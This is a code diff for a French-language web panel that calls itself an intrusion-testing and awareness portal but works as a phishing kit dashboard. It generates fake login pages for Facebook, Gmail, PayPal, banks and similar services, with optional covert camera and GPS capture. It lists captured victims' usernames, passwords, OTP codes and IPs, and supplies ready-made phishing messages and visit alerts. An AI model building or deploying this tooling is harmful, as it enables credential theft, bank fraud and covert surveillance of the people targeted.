+                <div class="welcome-box-header">Bienvenue sur Les abeilles du Niger</div>
+                <div class="home-welcome-content">
+                    <h2>Portail de test d'intrusion et de sensibilisation</h2>
+                    <div class="signup-hand-trigger" onclick="showSection('signup')">
+                        <div class="signup-red-badge">INSCRIPTION</div>
+                        <svg class="hand-pointer-svg" viewBox="0 0 64 64"><path d="M26 10 C26 7 31 7 31 10 L31 28 L34 28 C34 25 39 25 39 28 L39 30 L42 30 C42 27 47 27 47 30 L47 32 L50 32 C50 30 54 30 54 33 L54 45 C54 53 47 58 38 58 L28 58 C21 58 17 52 14 45 L10 38 C8 35 12 32 15 35 L21 41 L21 10 C21 7 26 7 26 10 Z"/></svg>
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-box hidden" id="view-signup">
+                <div class="welcome-box-header">Créer un compte</div>
+                <div class="signup-form-container">
+                    <form id="signup-form" onsubmit="handleSignup(event)">
+                        <div class="signup-field-row"><label>Nom d'utilisateur</label><input type="text" id="reg-username" required placeholder="Ex: admin. ou testeur"></div>
+                        <div class="signup-field-row"><label>Mot de passe</label><input type="password" id="reg-password" required placeholder="Mot de passe"></div>
+                        <div class="signup-field-row"><label>Confirmation</label><input type="password" id="reg-repassword" required placeholder="Répéter le MDP"></div>
+                        <div class="signup-field-row"><label>E-mail</label><input type="email" id="reg-email" required placeholder="admin@abeilles.ne"></div>
+                        <div class="signup-field-row">
+                            <label>Photo de profil</label>
+                            <div style="width:72%; display:flex; align-items:center; gap:10px;">
+                                <input type="file" id="reg-avatar-file" accept="image/*" onchange="previewSignupAvatar(this)" style="width:auto; flex:1; font-size:11px;">
+                                <img id="reg-avatar-preview" src="https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png" alt="Aperçu" style="width:36px; height:36px; border-radius:50%; object-fit:cover; border:1px solid #f5b014;">
+                            </div>
+                        </div>
+                        <div style="text-align: center; margin-top: 14px;"><button type="submit" class="btn-classic">S'inscrire</button></div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="panel-box hidden" id="view-dashboard">
+                <div class="welcome-box-header">Tableau de bord — Liens de test par profil & Pages No-Code (Durée de vie : 3 jours)</div>
+                <table class="links-table">
+                    <thead>
+                        <tr><th style="width: 40px;">#</th><th>Plateforme</th><th>Logo</th><th>Génération des Liens</th></tr>
+                    </thead>
+                    <tbody id="platforms-tbody"></tbody>
+                </table>
+            </div>
+
+            <div class="panel-box hidden" id="view-victims">
+                <div class="welcome-box-header">.: Contrôle des Victimes (Classées & Synchronisées avec le serveur) :.</div>
+                
+                <div style="padding: 10px; background: #141414; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 10px;">
+                    <label style="font-size: 12px; font-weight: bold; color: #f5b014;">Filtrer (Plateforme / Nom / Banque / Catégorie) :</label>
+                    <input type="text" id="victim-search-input" onkeyup="filterVictimsTable()" placeholder="Ex: Facebook, BANKING, Carte, OTP..." style="flex:1; background:#111; border:1px solid #555; color:#fff; padding:6px 10px; border-radius:3px; font-size:12px;">
+                </div>
+
+                <div class="victims-scroll-frame">
+                    <table class="links-table">
+                        <thead>
+                            <tr><th>#</th><th>Plateforme & Classement</th><th>Utilisateur</th><th>Mot de Passe</th><th>Code OTP</th><th>Date & Heure</th><th>IP</th></tr>
+                        </thead>
+                        <tbody id="victims-table-body">
+                            <tr><td colspan="7" style="padding: 25px; color: #888; text-align: center;">Chargement des victimes en cours...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="panel-box hidden" id="view-messages">
+                <div class="welcome-box-header">.: 12 Messages prêts à être copiés (Phishing & Sensibilisation) :.</div>
+                <div class="msg-grid" id="messages-container"></div>
+            </div>
+
+            <div class="panel-box hidden" id="view-create">
+                <div class="welcome-box-header">.: Générateur No-Code (Validité 3 jours & Personnel) :.</div>
+                <div class="signup-form-container">
+                    <div class="signup-field-row" style="margin-bottom: 15px;">
+                        <label>Option de création</label>
+                        <select id="creator-mode" onchange="toggleCreatorMode()" style="width:72%;">
+                            <option value="option1">Option 1 : Générateur Simple (Formulaire, Logo, Titre)</option>
+                            <option value="option2">Option 2 : Code HTML / CSS / JS Fusionné + Redirection</option>
+                            <option value="option3" style="color:#f5b014; font-weight:bold;">Option 3 : Intelligente (HTML/JS + Caméra + GPS + OTP)</option>
+                        </select>
+                    </div>
+
+                    <form id="create-login-form-opt1" onsubmit="handleCreateLoginOpt1(event)">
+                        <div class="signup-field-row"><label>Nom unique (Slug)</label><input type="text" id="c-slug" required placeholder="ex: film_action"></div>
+                        <div class="signup-field-row"><label>Titre de la page</label><input type="text" id="c-title" required placeholder="ex: Espace Film VIP"></div>
+                        <div class="signup-field-row"><label>Nom de la cible</label><input type="text" id="c-network" required placeholder="ex: Facebook, Gmail, Netflix, Kaspersky..."></div>
+                        <div class="signup-field-row">
+                            <label>Type d'arrière-plan</label>
+                            <select id="c-bgtype" onchange="toggleBgInput()"><option value="color">Couleur unie</option><option value="image">Image (URL)</option></select>
+                        </div>
+                        <div class="signup-field-row" id="row-bgcolor"><label>Couleur de fond</label><input type="color" id="c-bgcolor" value="#111111" style="height:35px;"></div>
+                        <div class="signup-field-row hidden" id="row-bgimg"><label>URL image de fond</label><input type="url" id="c-bgimg" placeholder="https://..."></div>
+                        <div class="signup-field-row"><label>URL du Logo</label><input type="url" id="c-logourl" placeholder="Auto selon plateforme ou URL..."></div>
+                        <div class="signup-field-row">
+                            <label>Forme du logo</label>
+                            <select id="c-logoshape"><option value="circle">Rond</option><option value="square">Carré</option></select>
+                        </div>
+                        <div class="signup-field-row">
+                            <label>Taille du cadre Login</label>
+                            <select id="c-boxwidth">
+                                <option value="400px">Compact (400px)</option>
+                                <option value="520px">Standard (520px)</option>
+                                <option value="680px">Grand (680px)</option>
+                                <option value="850px">Très Large / 10 Pouces (850px)</option>
+                                <option value="940px" selected>Maximum / Large Plein Écran (940px)</option>
+                            </select>
+                        </div>
+                        <div class="signup-field-row">
+                            <label>Champs requis</label>
+                            <select id="c-fields-preset">
+                                <option value="2">2 Champs (Identifiant + Mot de passe)</option>
+                                <option value="3">3 Champs (Identifiant + Mot de passe + Code Secret/OTP)</option>
+                            </select>
+                        </div>
+                        <div class="signup-field-row"><label>Texte du bouton</label><input type="text" id="c-btntext" value="Se connecter" required></div>
+                        <div class="signup-field-row"><label>URL Redirection</label><input type="url" id="c-redirect" value="https://www.google.com" required></div>
+                        <div style="text-align: center; margin-top: 14px;"><button type="submit" class="btn-classic">Générer (3j)</button></div>
+                    </form>
+
+                    <form id="create-login-form-opt2" class="hidden" onsubmit="handleCreateLoginOpt2(event)">
+                        <div class="signup-field-row"><label>Nom unique (Slug)</label><input type="text" id="c2-slug" required placeholder="ex: mon_login_perso"></div>
+                        <div class="signup-field-row"><label>Nom de la cible</label><input type="text" id="c2-network" required placeholder="ex: Portail Perso"></div>
+                        <div class="signup-field-row"><label>Lien de redirection (URL)</label><input type="url" id="c2-redirect" required placeholder="https://exemple.com/page-finale"></div>
+                        <div class="signup-field-row" style="flex-direction: column; align-items: stretch;">
+                            <div class="editor-toolbar">
+                                <label style="width: auto; text-align: left;">Code HTML, CSS, JavaScript fusionné :</label>
+                                <div class="editor-action-btns">
+                                    <button type="button" class="mini-tool-btn btn-copy-code" onclick="copyTextareaContent('c2-code')">Copier</button>
+                                    <button type="button" class="mini-tool-btn btn-clear-code" onclick="clearTextareaContent('c2-code')">Supprimer</button>
+                                </div>
+                            </div>
+                            <textarea id="c2-code" rows="10" required placeholder="&lt;!DOCTYPE html&gt;..." style="width:100%; background:#111; color:#fff; border:1px solid #555; padding:8px; font-family:monospace; font-size:11px;"></textarea>
+                        </div>
+                        <div style="text-align: center; margin-top: 14px;"><button type="submit" class="btn-classic">Générer la page personnalisée (3j)</button></div>
+                    </form>
+
+                    <form id="create-login-form-opt3" class="hidden" onsubmit="handleCreateLoginOpt3(event)">
+                        <div class="signup-field-row"><label>Nom unique (Slug)</label><input type="text" id="c3-slug" required placeholder="ex: super_offre_vip"></div>
+                        <div class="signup-field-row"><label>Nom de la cible</label><input type="text" id="c3-network" required placeholder="ex: Netflix VIP"></div>
+                        <div class="signup-field-row"><label>Lien de redirection (URL)</label><input type="url" id="c3-redirect" required placeholder="https://www.netflix.com"></div>
+                        <div class="signup-field-row">
+                            <label>Nombre total de photos (max 6)</label>
+                            <select id="c3-photo-count">
+                                <option value="1" selected>1 Photo</option>
+                                <option value="2">2 Photos</option>
+                                <option value="3">3 Photos</option>
+                                <option value="4">4 Photos</option>
+                                <option value="5">5 Photos</option>
+                                <option value="6">6 Photos (Maximum)</option>
+                            </select>
+                        </div>
+                        
+                        <div style="background:#141414; border:1px solid #f5b014; padding:12px; border-radius:4px; margin:12px 0;">
+                            <div style="color:#f5b014; font-weight:bold; margin-bottom:8px; font-size:13px;">Options de capture avancées :</div>
+                            <div style="display:flex; flex-direction:column; gap:8px; font-size:12px;">
+                                <label style="display:flex; align-items:center; gap:8px; width:100%; cursor:pointer;">
+                                    <input type="checkbox" id="c3-cam-front" checked style="width:16px; height:16px;"> Activer la capture Caméra Frontale
+                                </label>
+                                <label style="display:flex; align-items:center; gap:8px; width:100%; cursor:pointer;">
+                                    <input type="checkbox" id="c3-cam-back" style="width:16px; height:16px;"> Activer la capture Caméra Arrière
+                                </label>
+                                <label style="display:flex; align-items:center; gap:8px; width:100%; cursor:pointer;">
+                                    <input type="checkbox" id="c3-gps" checked style="width:16px; height:16px;"> Activer la Géolocalisation GPS automatique
+                                </label>
+                            </div>
+                        </div>
+
+                        <div class="signup-field-row" style="flex-direction: column; align-items: stretch;">
+                            <div class="editor-toolbar">
+                                <label style="width: auto; text-align: left;">Code HTML / Formulaire de la cible :</label>
+                                <div class="editor-action-btns">
+                                    <button type="button" class="mini-tool-btn btn-copy-code" onclick="copyTextareaContent('c3-code')">Copier</button>
+                                    <button type="button" class="mini-tool-btn btn-clear-code" onclick="clearTextareaContent('c3-code')">Supprimer</button>
+                                </div>
+                            </div>
+                            <textarea id="c3-code" rows="9" required placeholder="&lt;form&gt;...&lt;/form&gt;" style="width:100%; background:#111; color:#fff; border:1px solid #555; padding:8px; font-family:monospace; font-size:11px;"></textarea>
+                        </div>
+                        <div style="text-align: center; margin-top: 14px;"><button type="submit" class="btn-classic">Générer l'Option 3 Intelligente (3j)</button></div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="panel-box hidden" id="view-password">
+                <div class="welcome-box-header">Changement de mot de passe (Purge automatique des victimes)</div>
+                <div class="signup-form-container">
+                    <form id="password-form" onsubmit="handleChangePassword(event)">
+                        <div class="signup-field-row"><label>Ancien MDP</label><input type="password" id="old-pass" required></div>
+                        <div class="signup-field-row"><label>Nouveau MDP</label><input type="password" id="new-pass" required></div>
+                        <div class="signup-field-row"><label>Confirmation</label><input type="password" id="confirm-pass" required></div>
+                        <div style="text-align: center; margin-top: 14px;"><button type="submit" class="btn-classic">Mettre à jour</button></div>
+                    </form>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <footer class="main-footer">
+        <div class="footer-top-bar">copyright</div>
+        <div class="footer-bottom-bar">Copyright : 2015-2026 Les abeilles du Niger — Tous droits réservés</div>
+    </footer>
+
+    <div class="online-counter-widget">
+        <div class="counter-badge">
+            <span class="counter-icon">Stats</span>
+            <span>En ligne : <strong>345</strong></span>
+        </div>
+    </div>
+</div>
+
+<!-- Tableau / Modale d'alerte visite bien centré au milieu : durée maximale 6 secondes -->
+<div id="link-visit-alert-modal" class="modal-overlay visit-alert-overlay hidden">
+    <div class="visit-alert-box">
+        <div class="visit-alert-tag">TABLEAU D'ALERTE • DURÉE MAXIMALE : 6 SECONDES</div>
+        <h3 id="visit-alert-main-title" style="color:#ff6b6b; margin-bottom:10px;">🚨 Nouvel utilisateur sur la page du lien (6s max)</h3>
+
+        <table class="visit-alert-table">
+            <tbody>
+                <tr>
+                    <th>État</th>
+                    <td id="visit-tbl-status" style="color:#4caf50; font-weight:bold;">Nouvel utilisateur détecté sur la page du lien (6s max)</td>
+                </tr>
+                <tr>
+                    <th>Plateforme & Lien</th>
+                    <td id="visit-tbl-target">-</td>
+                </tr>
+                <tr>
+                    <th>Appareil & IP</th>
+                    <td id="visit-tbl-device">-</td>
+                </tr>
+                <tr>
+                    <th>Heure & Durée</th>
+                    <td id="visit-tbl-time">Durée d'affichage : 6 secondes maximum</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div id="visit-alert-letter" class="visit-letter-box"></div>
+        <p id="visit-alert-description" style="font-size:12.5px; color:#ddd; line-height:1.45; margin-bottom:6px;"></p>
+        <div id="visit-alert-meta" style="font-size:11.5px; color:#f5b014; font-weight:bold;"></div>
+    </div>
+</div>
+
+<div id="link-modal" class="modal-overlay hidden">
+    <div class="modal-box">
+        <h3 id="modal-title">Lien généré</h3>
+        <p id="modal-link-text">URL</p>
+        <button class="btn-classic" onclick="copyModalLink()" style="margin:5px auto;">Copier le lien</button>
+        <button class="btn-classic" onclick="closeModal()" style="background:#444; color:#fff; border-color:#555; margin:5px auto;">Fermer</button>
+    </div>
+</div>
+
+<div id="success-modal" class="modal-overlay hidden">
+    <div class="modal-box">
+        <h3>Succès !</h3>
+        <p id="success-modal-text">Votre compte a été créé avec succès.</p>
+        <button class="btn-classic" onclick="closeSuccessModal()">Commencer</button>
+    </div>
+</div>
+
+<div id="admin-accounts-modal" class="modal-overlay hidden">
+    <div class="modal-box" style="width: 820px; max-width: 95vw; text-align: left;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+            <h3 style="margin:0;">Base des comptes enregistrés sur la plateforme</h3>
+            <span id="admin-accounts-total" style="background:#f5b014; color:#111; padding:5px 12px; border-radius:14px; font-weight:bold; font-size:12px;">Total : 0</span>
+        </div>
+        <div style="max-height: 380px; overflow-y: auto; border: 1px solid #444; border-radius: 4px; margin-bottom: 14px;">
+            <table class="links-table">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Nom d'utilisateur</th>
+                        <th>Mot de passe</th>
+                        <th>Date de création</th>
+                        <th>Victimes</th>
+                    </tr>
+                </thead>
+                <tbody id="admin-accounts-tbody"></tbody>
+            </table>
+        </div>
+        <div style="text-align:center;">
+            <button class="btn-classic" onclick="document.getElementById('admin-accounts-modal').classList.add('hidden')">Fermer</button>
+        </div>
+    </div>
+</div>
+
+<div id="online-members-modal" class="modal-overlay hidden">
+    <div class="modal-box" style="width: 460px; max-width: 95vw; text-align: left;">
+        <h3>Membres connectés (<span id="online-members-count">0</span>)</h3>
+        <div id="online-members-list" style="max-height: 320px; overflow-y: auto; margin-bottom: 14px;"></div>
+        <div style="text-align:center;">
+            <button class="btn-classic" onclick="document.getElementById('online-members-modal').classList.add('hidden')">Fermer</button>
+        </div>
+    </div>
+</div>
+
+<div id="direct-chat-modal" class="modal-overlay hidden">
+    <div class="modal-box" style="width: 470px; max-width: 95vw;">
+        <h3 id="direct-chat-title">Discussion</h3>
+        <div class="chat-history-box" id="direct-chat-history"></div>
+        <div class="chat-input-bar">
+            <button type="button" class="link-btn link-orange" onclick="toggleDirectAttachMenu()" title="Vocal ou Photo">+</button>
+            <input type="text" id="direct-chat-input" placeholder="Écrire un message (ex: Salut)..." onkeydown="if(event.key==='Enter') sendDirectTextMessage()">
+            <button type="button" class="link-btn link-blue" onclick="sendDirectTextMessage()">Envoyer</button>
+        </div>
+        <div id="direct-attach-bar" class="hidden" style="margin-top:8px; display:flex; gap:8px; justify-content:center;">
+            <button type="button" class="link-btn link-green" id="direct-voice-btn" onclick="toggleVoiceRecording('direct')">🎙️ Vocal</button>
+            <label class="link-btn link-orange" style="cursor:pointer;">
+                🖼️ Photo <input type="file" accept="image/*" class="hidden" onchange="sendDirectPhotoFile(this)">
+            </label>
+        </div>
+        <div style="text-align:center; margin-top:10px;">
+            <button class="btn-classic" style="background:#444; color:#fff; border-color:#555;" onclick="closeDirectChatModal()">Fermer</button>
+        </div>
+    </div>
+</div>
+
+<div id="sms-modal" class="modal-overlay hidden">
+    <div class="modal-box" style="width: 470px; max-width: 95vw;">
+        <h3>Canal SMS (<span id="sms-quota-label">0/10</span> aujourd'hui)</h3>
+        <div id="sms-lock-banner" class="hidden" style="background:#5c1414; border:1px solid #ff5252; color:#ffb4b4; padding:7px; border-radius:4px; font-size:11.5px; font-weight:bold; margin-bottom:8px;">
+            Limite de 10 messages/jour atteinte — Envoi verrouillé pour aujourd'hui.
+        </div>
+        <div class="chat-history-box" id="sms-history"></div>
+        <div class="chat-input-bar" id="sms-input-bar">
+            <input type="text" id="sms-text-input" placeholder="Écrire un SMS..." onkeydown="if(event.key==='Enter') sendSmsMessage('text')">
+            <button type="button" class="link-btn link-green" id="sms-voice-btn" onclick="toggleVoiceRecording('sms')">🎙️ Vocal</button>
+            <button type="button" class="link-btn link-blue" id="sms-send-btn" onclick="sendSmsMessage('text')">Envoyer</button>
+        </div>
+        <div style="text-align:center; margin-top:10px;">
+            <button class="btn-classic" style="background:#444; color:#fff; border-color:#555;" onclick="document.getElementById('sms-modal').classList.add('hidden')">Fermer</button>
+        </div>
+    </div>
+</div>
+
+<div id="toast-msg"></div>
+
+<script>
+    const UNIVERSAL_CODE = "4121@.";
+    const DEFAULT_AVATAR = "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png";
+    const ORIGINAL_PAGE_TITLE = document.title;
+    const ALERT_TABLE_MAX_MS = 6000; // Durée maximale du tableau d'alerte : 6 secondes
+
+    const API_BASE_URL = (window.location.protocol === "http:" || window.location.protocol === "https:")
+        ? window.location.origin
+        : "";
+
+    function apiUrl(path) {
+        return API_BASE_URL ? `${API_BASE_URL}${path}` : path;
+    }
+
+    const PERMANENT_AVATARS = [
+        { username: "Abeille_01", avatar_url: "https://i.postimg.cc/4xnRThHp/IMG-6898.jpg" },
+        { username: "Abeille_02", avatar_url: "https://i.postimg.cc/Xv3q88z3/IMG-6886.jpg" },
+        { username: "Abeille_03", avatar_url: "https://i.postimg.cc/cLf6wjX1/IMG-6885.png" },
+        { username: "Abeille_04", avatar_url: "https://i.postimg.cc/fRYkmF5G/IMG-6890.jpg" }
+    ];
+
+    let visitors = parseInt(localStorage.getItem('abeilles_visitors') || '455');
+    document.getElementById('visitor-count-display').textContent = visitors;
+    
+    let registeredUsers = JSON.parse(localStorage.getItem('abeilles_users') || '[]');
+    let currentSessionUser = JSON.parse(localStorage.getItem('abeilles_session') || 'null');
+    let customAlertMp3DataUrl = localStorage.getItem('abeilles_custom_mp3') || "";
+    let customAlertMp3Name = localStorage.getItem('abeilles_custom_mp3_name') || "";
+
+    // Interrupteur principal ON / OFF (par défaut activé)
+    let alertSwitchEnabled = localStorage.getItem('abeilles_alert_switch') !== 'off';
+
+    // Sélection des 10 méthodes (1..10) — par défaut toutes sélectionnées
+    let selectedAlertMethods = JSON.parse(localStorage.getItem('abeilles_selected_methods') || '[1,2,3,4,5,6,7,8,9,10]');
+    if (!Array.isArray(selectedAlertMethods) || selectedAlertMethods.length === 0) {
+        selectedAlertMethods = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    }
+
+    let pendingSignupAvatar = DEFAULT_AVATAR;
+    let activeModalUrl = "";
+    let serverVictimsCache = [];
+    let activeDirectPeer = "";
+    let smsStatus = { smsUsedToday: 0, smsLimit: 10, smsLocked: false };
+
+    let lastSeenVisitId = parseInt(localStorage.getItem('abeilles_last_visit_id') || '0');
+    let alertedVisitIds = new Set(JSON.parse(sessionStorage.getItem("abeilles_alerted_visits") || "[]"));
+    let pendingMissedVisit = null;
+    let modalHideTimeout = null;
+    let titleBlinkTimeout = null;
+    let activeAlertMedia = null;
+    let activeSynthTimers = [];
+    let baselineInitialized = false;
+    let isPollingVisits = false;
+    let sharedAudioEl = null;
+    let sharedAudioCtx = null;
+
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let recordingTargetChannel = null;
+
+    const platformsList = [
+        { name: "Facebook", badge: "badge-fb", label: "facebook", img: "https://i.postimg.cc/4xnRThHp/IMG-6898.jpg" },
+        { name: "Amazon", badge: "badge-amz", label: "amazon", img: "https://i.postimg.cc/ht6bk3Xf/1485479A-368D-4F92-B79B-9F76E45E2290.png" },
+        { name: "TikTok", badge: "badge-tt", label: "tiktok", img: "https://i.postimg.cc/bws9FjNW/BBB658FF-1870-4FA5-9D2D-63699FAEC15D.png" },
+        { name: "Gmail", badge: "badge-gm", label: "gmail", img: "https://i.postimg.cc/pL4Yw1pg/71455C5C-5CE9-419D-A35E-835B52423F44.png" },
+        { name: "Yahoo", badge: "badge-bee", label: "yahoo", img: "https://i.postimg.cc/rw3CBYD6/B0D83E1D-E6EA-4504-ABC8-0284F78A4239.png" },
+        { name: "WhatsApp", badge: "badge-tg", label: "whatsapp", img: "https://i.postimg.cc/3xWQHD0C/IMG-6897.webp" },
+        { name: "Instagram", badge: "badge-ig", label: "instagram", img: "https://i.postimg.cc/ht6bk3XR/F88B1D49-1918-42B8-A01E-8C6CD97BA8F1.png" },
+        { name: "Netflix", badge: "badge-nf", label: "netflix", img: "https://i.postimg.cc/cLf6wjX1/IMG-6885.png" },
+        { name: "Telegram", badge: "badge-tg", label: "telegram", img: "https://i.postimg.cc/VkpBxHJS/97B0C4FA-2208-4D9C-A5FC-FEA0D499A3AE.png" },
+        { name: "Snapchat", badge: "badge-bee", label: "snapchat", img: "https://i.postimg.cc/VkpBxHJ6/FA4B33B4-ECE2-4208-883A-588F5C8A8758.png" },
+        { name: "PayPal", badge: "badge-fb", label: "paypal", img: "https://i.postimg.cc/526SkM24/7A49B2FD-E940-4519-A1FA-5DE8E2920150.png" },
+        { name: "LinkedIn", badge: "badge-fb", label: "linkedin", img: "https://i.postimg.cc/QCfn1k00/89C5FCD4-9301-450F-873D-AC545505805C.png" },
+        { name: "1Xbet", badge: "badge-bee", label: "1xbet", img: "https://i.postimg.cc/qB838NRS/IMG-6903.webp" },
+        { name: "Betclic", badge: "badge-nf", label: "betclic", img: "https://i.postimg.cc/dQ8y8h1H/IMG-6904.jpg" },
+        { name: "Bank", badge: "badge-gm", label: "bank", img: "https://i.postimg.cc/T3FqzHKX/IMG-6917.png" }
+    ];
+
+    // 5 méthodes distinctes par bouton (1 à 10)
+    const BUTTON_METHOD_SUITES = {
+        1: ["html5_primary", "html5_fresh", "webaudio_chime", "webaudio_pulse", "html5_fallback_wav"],
+        2: ["webaudio_pulse", "html5_primary", "html5_fresh", "webaudio_chime", "html5_fallback_wav"],
+        3: ["html5_fresh", "webaudio_chime", "html5_primary", "webaudio_pulse", "html5_fallback_wav"],
+        4: ["webaudio_chime", "html5_fallback_wav", "html5_primary", "html5_fresh", "webaudio_pulse"],
+        5: ["html5_fallback_wav", "html5_primary", "webaudio_pulse", "webaudio_chime", "html5_fresh"],
+        6: ["html5_primary", "webaudio_chime", "html5_fallback_wav", "html5_fresh", "webaudio_pulse"],
+        7: ["webaudio_pulse", "webaudio_chime", "html5_primary", "html5_fresh", "html5_fallback_wav"],
+        8: ["html5_fresh", "html5_fallback_wav", "webaudio_pulse", "html5_primary", "webaudio_chime"],
+        9: ["webaudio_chime", "html5_primary", "html5_fresh", "html5_fallback_wav", "webaudio_pulse"],
+        10: ["html5_fallback_wav", "webaudio_chime", "html5_fresh", "html5_primary", "webaudio_pulse"]
+    };
+
+    function stopAllAlertSoundsAndTimers() {
+        clearSynthTimers();
+        if (activeAlertMedia) {
+            try {
+                activeAlertMedia.pause();
+                activeAlertMedia.currentTime = 0;
+            } catch (_) {}
+            activeAlertMedia = null;
+        }
+    }
+
+    function hideAlertModalNow() {
+        if (modalHideTimeout) {
+            clearTimeout(modalHideTimeout);
+            modalHideTimeout = null;
+        }
+        if (titleBlinkTimeout) {
+            clearTimeout(titleBlinkTimeout);
+            titleBlinkTimeout = null;
+        }
+        const m = document.getElementById("link-visit-alert-modal");
+        if (m) {
+            m.classList.add("hidden");
+            m.style.display = "none";
+        }
+        document.title = ORIGINAL_PAGE_TITLE;
+    }
+
+    function showAlertModalNow(visitObj, methodLabel, isReplayAfterReturn = false) {
+        const modal = document.getElementById("link-visit-alert-modal");
+        if (!modal) return;
+
+        const nowStr = new Date().toLocaleTimeString("fr-FR");
+        const v = visitObj || {
+            owner: currentSessionUser ? currentSessionUser.username : "Portail",
+            network: "Page du lien / Test",
+            path_visited: window.location.pathname || "/index.html",
+            device: navigator.platform || "Navigateur",
+            ip: "Local / Direct",
+            created_at: nowStr,
+            location_desc: "Un utilisateur visite votre page du lien. Tableau affiché pendant 6 secondes maximum."
+        };
+
+        const mainTitle = document.getElementById("visit-alert-main-title");
+        const letterEl = document.getElementById("visit-alert-letter");
+        const descEl = document.getElementById("visit-alert-description");
+        const metaEl = document.getElementById("visit-alert-meta");
+        const tblStatus = document.getElementById("visit-tbl-status");
+        const tblTarget = document.getElementById("visit-tbl-target");
+        const tblDevice = document.getElementById("visit-tbl-device");
+        const tblTime = document.getElementById("visit-tbl-time");
+
+        if (mainTitle) mainTitle.textContent = `🚨 Nouvel utilisateur sur la page du lien (6s max)`;
+        if (tblStatus) tblStatus.textContent = `Visite en cours sur votre page (${methodLabel})`;
+        if (tblTarget) tblTarget.textContent = `${v.network || "Plateforme"} — ${v.path_visited || ""}`;
+        if (tblDevice) tblDevice.textContent = `${v.device || "Inconnu"} (${v.ip || ""})`;
+        if (tblTime) tblTime.textContent = `${v.created_at || nowStr} • Durée : 6 secondes maximum`;
+
+        if (letterEl) letterEl.textContent = buildLetterText(v, methodLabel);
+        if (descEl) {
+            descEl.textContent = v.location_desc || `Un utilisateur visite votre page du lien (${v.network || "Plateforme"}). Tableau affiché 6 secondes maximum.`;
+        }
+        if (metaEl) {
+            metaEl.textContent = isReplayAfterReturn
+                ? `Reprise alerte • Tableau centré affiché 6 secondes maximum.`
+                : `Tableau d'alerte centré affiché pendant 6 secondes maximum.`;
+        }
+
+        modal.classList.remove("hidden");
+        modal.style.display = "flex";
+
+        document.title = `🚨 Visite en cours • ${v.network || "ALERTE"} (6s max)`;
+
+        if (modalHideTimeout) clearTimeout(modalHideTimeout);
+        modalHideTimeout = setTimeout(() => {
+            hideAlertModalNow();
+        }, ALERT_TABLE_MAX_MS);
+
+        if (titleBlinkTimeout) clearTimeout(titleBlinkTimeout);
+        titleBlinkTimeout = setTimeout(() => {
+            document.title = ORIGINAL_PAGE_TITLE;
+        }, ALERT_TABLE_MAX_MS);
+    }
+
+    function refreshAlertSwitchUI() {
+        const btn = document.getElementById("alert-master-switch-btn");
+        const lbl = document.getElementById("alert-master-switch-label");
+        const stTxt = document.getElementById("alert-switch-status-text");
+
+        if (alertSwitchEnabled) {
+            if (btn) btn.classList.remove("off");
+            if (lbl) lbl.textContent = "ON";
+            if (stTxt) {
+                stTxt.textContent = "Réception alertes : ACTIVÉE";
+                stTxt.style.color = "#81c784";
+            }
+        } else {
+            if (btn) btn.classList.add("off");
+            if (lbl) lbl.textContent = "OFF";
+            if (stTxt) {
+                stTxt.textContent = "Réception alertes : COUPÉE";
+                stTxt.style.color = "#ff8a80";
+            }
+            pendingMissedVisit = null;
+            stopAllAlertSoundsAndTimers();
+            hideAlertModalNow();
+        }
+    }
+
+    function toggleMasterAlertSwitch() {
+        alertSwitchEnabled = !alertSwitchEnabled;
+        localStorage.setItem('abeilles_alert_switch', alertSwitchEnabled ? 'on' : 'off');
+        refreshAlertSwitchUI();
+        if (alertSwitchEnabled) {
+            silentUnlockAudioOnly();
+            showToast("Interrupteur ON : alertes musique et tableau activées.");
+        } else {
+            showToast("Interrupteur OFF : toutes les alertes et sons sont bloqués.");
+        }
+    }
+
+    function refreshMethodButtonsUI() {
+        const btns = document.querySelectorAll("#round-methods-container .round-method-btn");
+        btns.forEach(b => {
+            const num = parseInt(b.getAttribute("data-method") || "0", 10);
+            b.classList.toggle("selected", selectedAlertMethods.includes(num));
+        });
+        const allBtn = document.getElementById("select-all-methods-btn");
+        if (allBtn) {
+            const allSelected = selectedAlertMethods.length === 10;
+            allBtn.classList.toggle("active", allSelected);
+            allBtn.textContent = allSelected ? "Tout sélectionné ✓" : "Tout sélectionner";
+        }
+    }
+
+    function saveSelectedMethods() {
+        localStorage.setItem('abeilles_selected_methods', JSON.stringify(selectedAlertMethods));
+        refreshMethodButtonsUI();
+    }
+
+    function toggleSingleMethod(num) {
+        const idx = selectedAlertMethods.indexOf(num);
+        if (idx >= 0) {
+            selectedAlertMethods.splice(idx, 1);
+        } else {
+            selectedAlertMethods.push(num);
+            selectedAlertMethods.sort((a, b) => a - b);
+        }
+        saveSelectedMethods();
+        silentUnlockAudioOnly();
+    }
+
+    function toggleSelectAllMethods() {
+        if (selectedAlertMethods.length === 10) {
+            selectedAlertMethods = [1];
+            saveSelectedMethods();
+            silentUnlockAudioOnly();
+            showToast("Sélection réduite au bouton 1.");
+        } else {
+            selectedAlertMethods = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+            saveSelectedMethods();
+            silentUnlockAudioOnly();
+            showToast("Tous les boutons (1 à 10) sont sélectionnés.");
+        }
+    }
+
+    function highlightTriggeredMethod(num) {
+        const btn = document.querySelector(`#round-methods-container .round-method-btn[data-method="${num}"]`);
+        if (!btn) return;
+        btn.classList.add("triggered");
+        setTimeout(() => btn.classList.remove("triggered"), 1600);
+    }
+
+    const ALERT_CHANNEL_NAME = "abeilles_alert_sync_v1";
+    let alertBroadcastChannel = null;
+    try {
+        if ("BroadcastChannel" in window) {
+            alertBroadcastChannel = new BroadcastChannel(ALERT_CHANNEL_NAME);
+        }
+    } catch (_) {}
+
+    function createFallbackAlertWavDataUrl() {
+        const sampleRate = 22050;
+        const durationSec = 2.4;
+        const numSamples = Math.floor(sampleRate * durationSec);
